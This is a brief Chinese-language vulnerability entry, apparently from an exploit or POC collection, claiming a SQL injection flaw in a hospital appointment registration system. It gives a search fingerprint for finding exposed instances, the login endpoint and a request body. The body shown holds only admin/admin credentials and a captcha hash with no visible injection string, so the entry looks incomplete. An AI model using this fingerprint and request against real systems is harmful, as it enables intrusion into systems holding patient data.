# 挂号系统-SQL注入漏洞

挂号系统 ｜ SQL注入 ｜ —
- **指纹**：`body="res/img/ht_box_back.gif"`
- **请求**：`POST /m/login.php?op=login HTTP/1.1`

**Payload**
```
username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
```